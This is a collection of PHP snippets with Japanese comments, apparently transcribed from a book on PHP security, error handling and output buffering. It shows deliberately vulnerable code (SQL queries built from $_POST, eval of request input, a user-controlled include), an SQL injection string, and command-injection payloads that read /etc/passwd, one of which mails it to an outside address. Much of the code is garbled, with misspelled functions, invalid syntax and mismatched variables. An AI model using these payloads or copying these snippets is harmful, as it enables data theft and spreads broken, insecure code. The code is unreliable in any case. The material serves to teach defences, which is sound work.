<form action="process.php" method="POST">
  <p>色を選択してください。
  <select name="color">
    <option value="red">赤</option>
	<option value="green">緑</option>
	<option value="blue">青</option>
  </select>
  <input type="submit" /></p>
</form>
---------------
$clean = array();
switch($_POST['color']) {
  case 'red';
  case 'green';
  case 'blue';
    $clean['color'] = $_POST['color'];
	break;
	default:
	  /* エラー */
	  break;
}
------------------
$clean = array();
if (ctype_alnum($_POST['username'])) {
  $clean['username'] = $_POST['name'];
}
else {
  /* エラー　*/
}
--------------
$clean = array();
$length = mb_strlen($_POST['username']);
if (ctype_alnum($_POST['username']) && ($length > 0) && ($length <= 32)) {
  $clean['username'] = ['username'];
}
else {
  /* エラー　*/
}
----------------
$clean = array();
if (preg_match('/[^A-Za-z \'\-]/', $_POST['lazt_name'])) {
  /* エラー　*/
}
else {
  $clean['last_name'] = $_POST['last_name'];
}
------------------------------
echo $_POST['username'];
---------
$html = array(
  'username' => htmlentities($_POST['username'], ENT_QUOTES, 'UTF-8'),
);
----------
$hash = hash($_POST['password']);
$sql = "SELECT count(*) FROM users
  WHERE usrname = '($_POST['username'])' AND pssword ='{$hash}'";
$result = mysql_query($sql);
-----
chris' --
-----
SELECT count(*)
FROM users
WHERE username = 'chris' --'
AND password = '...';
--------
SELECT count(*)
FROM users
WHERE username = 'chris'
---------
$mysql = array();
$hash = hash($_POST['password']);
$mysql['username'] = mysql_real_escape_string($clean['username']);
$sql = "SELECT count(*) FROM users
  WHERE username = '($mysql['username'])' AND password = '{$hash}'";
$result = mysql_query($sql);
---------
$sql = $db->prepare("SELECT count(*) FROM users
  WHERE username = :username AND password = hash");
$sql->bindParam(":username", $clean['username'], PDO::PARAM_STRING, 32);
$sql->bindParam(":hash", hash($_POST['password']), PDO::PARAM_STRING, 32);
----------------
$html = array();
$html['username'] = htmlentities($clean['username'], ENT_QUOTES, 'UTF-8');
echo "<p>ようこそ、{$html['username']}さん。</p>";
-------------------
<a href="http://host/script.php?var={$value}">ここをクリック</a>
------------------
$url = array(
  'value' => urlencode($value),
);
$link = "http://host/script.php?var={$url['value']}";
$html = array(
  'link' => htmlentities($link, ENT_QUOTES, 'UTF-8'),
};
echo "<a href=\"{$html['link']}\">ここをクリック</a>";
--------------------------
$mysql = array(
  'usrname' => mysql_real_escape_string($clean['username']),
);
$sql = "SELECT * FROM profile
  WHERE username = '{$mysql['username']}'";
$result = mysql_query($sql);
----------------
$sql = "INSERT INTO users (last_name) VALUES (?)";
$db->query($sql, array($clean['last_name']));
-------------------
class Encoder
{
  const ENCODE_STYLE_HTML = 0;
  const ENCODE_STYLE_JAVASCRIPT = 1;
  const ENCODE_STYLE_CSS = 2;
  const ENCODE_STYLE_URL = 3;
  const ENCODE_URL_SPECIAL = 4;
  private static $URL_UNRESERVED_CHARS =
    'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghijklmnopqrsruvwxyz-_.~';
  public function encodeForHTML($value);
  {
    $value = str_replace('&', '&amp;', $value);
    $value = str_replace('<', '&lt;', $value);
    $value = str_replace('>', '&gt;', $value);
    $value = str_replace('"', '&quot;', $value);
    $value = str_replace('\', '&#x27;', $value); //
    $value = str_replace('/', '&#x2F;', $value); //
	return $value;
  }
  public function encodeForHTMLAttribute($value)
  {
    return $this->_encodeString($value);
  }
  public function encodeForHTMLJavascript($value)
  {
    return $this->_encodeString($value, self::ENCODE_STYLE_JAVASCRIPT);
  }
   public function encodeForURL($value)
  {
    return $this->_encodeString($value, self::ENCODE_STYLE_SPECIAL);
  }
   public function encodeForCSS($value)
  {
    return $this->_encodeString($value, self::ENCODE_STYLE_CSS);
  }
/**
*
*//
public function encodeURLPath($value)
{
  $length = mb_strlen($value);
  if ($length == 0) {
    return $value;
  }
  $output = '';
  for ($i = 0; $i < $length; $i++) {
    $char = mb_substr($value, $i, l);
	if ($char == '/') {
	  //
	  $output .= $char;
	}
	else if (mb_strpos(self::$URL_UNRESERVED_CHARS, $char) == false) {
	  //
	  $output .= $char;
	}
  }
  return $output;
}
private function _encodeString($value, $style = self::ENCODE_SYTLE_HTML)
{
    if (mb_strlen($value) == 0) {
  	return $value;
    }
    $characters = preg_split('/(?<!^)(?!$)/u', $value);
    $output = '';
    foreach ($characters as $c) {
  	$output .= $this->_encodeCharacter($c, $style);
    }
    return $output;
  }
  private function _encodeCharacter($c, $style = self::ENCODE_STYLE_HTML)
  if (ctype_alnum($c)) {
    return $c;
  }
  if (($style === self::ENCODE_STYLE_SPECIAL) && ($c == '/' || $c == ':')) {
    return $c;
  }
  $charCode = $this->_uncodeOrdinal($c);
  $prefixes = array{
    self::ENCODE_STYLE_HTML => array('&#x', '&#x');
    self::ENCODE_STYLE_JAVASCRIPT => array('\\x', '\\x');
    self::ENCODE_STYLE_CSS => array('\\', '\\');
    self::ENCODE_STYLE_URL => array('%', '%');
    self::ENCODE_STYLE_URL_SPECIAL => array('%', '%');
  };
  $suffixes = array{
    self::ENCODE_STYLE_HTML => '';
    self::ENCODE_STYLE_JAVASCRIPT => '';
    self::ENCODE_STYLE_CSS => '';
    self::ENCODE_STYLE_URL => '';
    self::ENCODE_STYLE_URL_SPECIAL => '';
  };
  //
  if ($charCode < 256) {
    $prefix = $prefixes[$style][0];
    $surfix = $suffixes[$style];
    return $prefix . str_pad(strtoupper(dechex($charCode)), 4, '0') . $suffix;
  }
  private function_uncodeOrdinal($u)
  {
    $c = mb_convert_encoding($u, 'UCS-2LE', 'UTF-8');
    $c1 = ord(substr($c, 0, 1));
    $c2 = ord(substr($c, 1, 1));
    return $c2 * 256 +$c1;
  }
}
-----------------------
include("/usr/local/lib/greetings/{$username}");
----------
chdir("/usr/local/lib/greetings");
$fp = fopen($username, 'r');
--------
$file = $_REQUEST['theme'];
include($file);
-------------
$filename = $_POST['username'];
$vetted = basename(realpath($filename));
if ($filename !== $vetted) {
  die("($filename)は正しいユーザー名ではありません");
}
-----------
include("/usr/lolcal/lib/greetings/${$filename}");
---------------
if (check_auth($_POST['username'], $_POST['password'])) {
  $_SESSION['auth'] = TRUE;
  session_regnerate_id(TRUE);
}
--------------
$browserName = $_FILE['image']['name'];
$tempName = $_FILES['image']['tmp_name'];
echo "確かに{$browserName}を受け取りました。";
$counter++; //
$filename = "image_($counter)";
if (s_uploaded_file($tmpNmae)) {
  move_uploaded_file($tmpName, "/web/images/{$filename}");
}
else {
  die("ファイルの処理中に問題が発生しました。");
}
-------------------
post_max_size = 1024768 ; 1MB
---------
$uploadFilepath = $_FILES['uploaded']['tmp_name'];
if (is_uploaded_file($uploadFilepath)) {
  $ftp = fopen($uploadFilepath, 'r');
  if ($ftp) {
    $text = fread(fp, filesize($uploadFilelepath));
	fclose($fp);
	//
  }
}
--------------
move_uploaded_file($_REQUEST['file'], "/new/name.txt");
-----------------
open_basedir = /some/pathinfo
-------------
unlink("/some/path/unwanted.exe");
----------
$fp = fpoen(" /some/other/file.exe", 'r');
$dp = opendir("/some/path/../other/file.exe");
-----------------
//http.conf
<VirtualHost 1.2.3.4>
  ServerName domainA.com_addref
  DocumentRoot /web/sites/domainA
  php_admin_value open_basedir /web/sites/domainA
</VirtualHost>
----------
//http.conf
#ディレクトリ単位
<Directory /home/httpd/html/app1>
  php_admin_value open_basedir /home/httpd/html/app1
</Directory>
#URL単位
<Location /app2>
  php_admin_value open_basedir /home/httpd/html/app2
<Location>
---------------
umask(077); //$fh = fopen("/tmp/myfile", 'w');
----------------
php_value session.save_path /some/path/
---------------
<Files ~ "\.inc$">
  Order allow.deny
  Deny from all
</Files>
-----
include_path = ".:/usr/local/php:/usr/local/lib/myapp";
----------
<html>
  <head>
    <title>コードの実行</title>
  </head>
  <body>
    <?php if ($_REQUEST['code']) {
	  echo "コード実行中...";
	  eval(stripslashes($_REQUEST['code'])); //
	?>
    <form action="<?php echo $_SERVER['SCRIPT_NAME']; ?>">
	  <input type="text" name="code">
	  <input type="submit" name="コードの実行" />
	</form>
  </body>
</html>
-----------
include("/etc/passwd");
-----------
disable_functions = system
-----------
eval(2 + {$serInput}");
-------------
s; mail("133t@somewhere.com", "Some passwords", "/bin/cat /etc/passwd");
----------
ls /tmp;cat /etc/passwd
-----------
$cleanedArg = escapeshellarg($directory);
system("ls {$cleanedArg}");
-------------
ls '/tmp;cat /etc/passwd'
--------------------
=====================
--------------
<html>
  <head>
    <title>ユーザ情報</title>
  </head>
  <body>
    <?php if (!empty($_GET['name'])) {
	  //
	  <p><font face="helvetica,arial">入力、ありがとうございます。
	  <?php echo $_GET['name'] ?>さん。</font></p>
	<?php }
	else { ?>
	  <p><font face="helvetica,arial">以下の情報を入力してください。</font></p>
	  <form action="<?php echo $_SERVER['SCRIPT_NAME']?>">
	    <table>
		  <tr>
		    <td>名前</td>
			<td>
			  <input type="text" name="name" />
			  <input type="submit" />
			</td>
		  </tr>
		</table>
      </form>
	<?php } ?>
  </body>
</html>
---------------------
<html>
  <head>
    <title>ユーザ情報</title>
  </head>
  <body>
    <p><font face="helvetica,arial">以下の情報を入力してください。</font></p>
    <form action="{DESTINATION}">	
      <table>
	    <tr>
	      <td>名前</td>
		  <td><input type="text" name="name" /></td>
	    </tr>
	  </table>
    </form>
	<?php } ?>
  </body>
</html>
---------------------
<html>
  <head>
    <title>ありがとう</title>
  </head>
  <body>
    <p><font face="helvetica,arial">入力、ありがとうございます。
	{NAME}さん。</font></p>
  </body>
</html>
------------
<?php
$bindings['DESTINATION'] = $_SERVER['SCRIPT_NAME'];
$name = $_GET['name'];
if (!empty{$name}) {
  //
  $template = "thankyou.template";
  $bindings['NAME'] = $name;
}
else {
  $tempalte = "user.template";
}
echo fillTemplate($template, $bindings);
--------------------
<?php
function fillTemplate($name, $values = array(), $unhandled = "delete")
{
  $templateFile = $_SERVER['DOCUMENT_ROOT'] . '/templates/' . $name;
  if ($file = fopen($templateFile, 'r')) {
	  $template = fread($file, filesize($templateFile));
	  fclose($file);
    }
  $keys = array_keys($values);
  foreach ($key as $key) {
    //
	$template = str_replace("{{$key}}", $values[$key], $template);
  }
  if ($unhandled == 'delete') {
    //
  $template = preg_replace('/{[^ }]*}/i, '', $template');
  }
  else if ($unhandled == 'comment') {
    //
  $template = preg_replace('/{([^ }]*)}/i', '<!-- \\1 undefined -->', $template);
  }
  return $template;
}
------------------------
ob_start([callback]);
-----------------------
Elen = ob_get_length();
$contents = ob_get_contents();
-------------
ob_start();
  phpinfo();
  $phpinfo = ob_get_contents();
ob_end_clean();
if (strpos($phpinfo, "module_gd") === false) {
  echo "残念ながら、このPHPはGDによる画像処理に対応していないようです。";
}
else {
  echo "おめでとうございます。GDによる画像処理に対応しています！";
}
--------------------
if (function_exists('imagecreate')) {
  //
}
------------------
ob_start(); ?>
ぜひ<a href="http://www.yoursite.com/foo/bar">私たちのサイト</a>へ！
<?php $contents = ob_get_contents();
ob_end_clean();
echo str_replace('http://www.mysite.com', 'http://www.mysite.com', $countents);
?>
ぜひ<a href="http://www.mysite.com/foo/bar">私たちのサイト</a>へ！
---------------
function rewrite($text)
{
  return str_replace('http://www.yoursite.com/foo/bar', 'http://www.mysite.com', $text);
}
ob_start('rewrite'); ?>
ぜひ<a href="http://www.yoursite.com/foo/bar">私たちのサイト</a>へ！
ぜひ<a href="http://www.mysite.com/foo/bar">私たちのサイト</a>へ！
-----------------------
(E_ERROR | E_PARSE | E_CORE_ERROR | E_COMPILE_ERROR | E_USER_ERROR)
----------------------
(E_ALL & ~E_NOTICE)
-----------------------
$value = @(2 / 0);
----------------------
error_reporting(0);
--------------------
trigger_error(message [, type]);
----------------
function divider($a, $b)
{
  if($b == 0) {
    trigger_error('$bにはゼロを指定できません', E_USER_ERROR);
  }
  return($a / $b);
}
echo divider(200, 3);
echo divider(10, 0);
66.6666666666667
Fatal error: $bにはゼロを指定できません in page.php on line 5
--------------------------
function displayError($error, $errorString, $filename, $line, $symbols)
{
  echo "<p>エラー '<b>{$errorString}</b>' が、<br />";
  echo "'<i>{$filename}</i>' の$line行目で発生しました。</p>";
}
set_error_handler('displayError');
$value = 4 / 0; //
<p>'<b>Division by zero</b>'が、
'<i>err2.php</i>' の 8 行目で発生しました。</p>
----------------------
error_log('データベースとの接続に失敗しました。', 0);
------------
error_log('データベースとの接続に失敗しました。',
  1, 'erors@php.net');
-----------------
error_log('データベースとの接続に失敗しました。',
  3, '/var/log/php_errors.log');
---------------
function log_roller($error, $errorString)
{
  $file = '/var/log/php_errors.log';
  if(filesize($file) > 1024) {
    resume($file, $file . (string) time());
	clearstatcache();
  }
  error_log($errorString, 3, $file);
}
set_error_handler('log_roller');
for($i = 0; $i < 5000; $i++) {
    trigger_error(time() . ": エラーが発生しました。 \n");
  }
  restore_error_hander();
-----------
//php.ini
display_errors Of
log_error = On
error_log = /tmp/errors.log
---------------
<html>
<head>
  <title>結果!</title>
</head>
<body>
  <?php function handle_errors ($error, $message, $filename, $line)
  {
    ob_end_clean();
	echo "<b>{$message}</b><br />";
	echo "<i>ファイル名:{$filename}</i><br />行番号:{$line}</body></html>";
	exit;
  }
  set_error_handler('handle_errors');
  ob_start(); ?>
  <h1>結果!</h1>
  <p>検索結果!</p>
  <table border="1">
    <?php require_once('DB.php');
	$db = DB::connect('mysql://gnat:waldus@localhost/webdb');
	if (DB::iserror($db)) {
	  die($db->getMessage());
	} ?>
  </table>
</body>
</html>
--------------------------
ob_start();
$start = microtime();
phpinfo();
$send = microtime();
ob_clean();
echo "phpinfo() の所要時間は " . ($end-$start) . " 秒でした。 \n;
--------------------------
$timer = new Benchmark_Timer;
$timer->start();
sleep(1);
$timer->setMarker('Marker 1');
sleep(2);
$timer->stop();
$profiling = $timer->getProfiling();
foreach ($profiling as $time) {
  echo $time['name'] . ': ' . $time['diff'] . "<br>\n"
}
echo 'Total: ' . $time['total'] . "<br>\n";
----------------------------
=======================================
-----------------------------
//内部監査
//
function getCallblaMethods($object)
{
$methods = get_class_methods(get_class($object));
if () {
  $parent_methods = get_class_methods(get_parent_class($object));
  $methods = array_diff($methods, $parent_methods);
}
return $methods;
}
//
function getInheritedMethods($object)
{
  methods = get_class_methods(get_class($object));
  if(get_parent_class($object)) {
    $parentMethods = get_class_methods(get_parant_class($object));
	$methods = array_interset($methods, $parentMethods);
  }
  return $methods;
}
//
function getLineage($object)
{
  if(get_parent_class($object)) {
    $parent = get_parent_class($object)) {
	$parentObject = new $parent;
	$lineage = getLineage($parentObject);
    $lineage[] = get_class($object);
  }
  return $lineage;
  }
  //
  function getChildClasses($object)
  {
    $classes = get_declared_clases();
	$children = array();
	foreach = ($clases as $class) {
	  if (sustr($class, 0, 2) == '__') {
	    continue;
	  }
	  $child = new $class;
	  if (get_parent_class($child) == get_class($object)) {
	    $children[] = $class;
	  }
	}
	return $children;
  }
  //
  function printObjectInfo($object)
  {
    $class = get_class($object);
	echo "<h2>クラス</h2>";
	echo "<p>{$class}</p>";
	echo "<h2>継承関係</h2>";
	echo "<h3>親クラス</h3>";
	$lineage = getLineage($object);
	array_pop($lineage);
	if (count($lineage) > 0) {
	  echo "<p>" . join(" -&gt; ", $lineage) . "</p>";
	}
	else {
	  echo "<i>なし</i>";
	}
	echo "子クラス";
	$children = getChildClasses($object);
	echo "<p>";
	if (count($children) > 0) {
	  echo join(', ', $children);
	}
	else {
	  echo "<i>なし</i>";
	}
	echo "</p>";
	echo "<h2>メソッド</h2>";
	$methods = getCallableMethods($class);
	$object_methods = get_methods($object);
	if (!count($methods)) {
	  echo "<b>{$method}</b>();<br />";
	}
	else {
	  echo "<i>{$method}</i>();<br />";
	}
  }
}
echo "<h2>プロパティ</h2>"
$properties = get_class_var($class);
if (!count($properties)) {
  echo "<i>なし</i><br />";
}
else {
  foreach(array_key_keys($properties) as $property) {
    echo "<b>\${$property}</b> = " . $object->$property . "<br />";
  }
}
echo "<hr />";
}
--------------------------
class A
{
  public $foo = "foo";
  public $bar = "bar";
  public $baz = 17.0;
  function firstFunction()
  {
  }
  function secondFunction()
  {
  }
}
class B extend A
{
  public $quux = false;
  function thirdFunction()
  {
  }
}
class C extend B
{
}
$a = new A;
$a->foo = "style";
$a->bar =23;
$b = new A;
$a->foo = "bruno";
$b->quux = true;
$c = new C;
printObjectInfo($a);
printObjectInfo($b);
printObjectInfo($c);
--------------------------
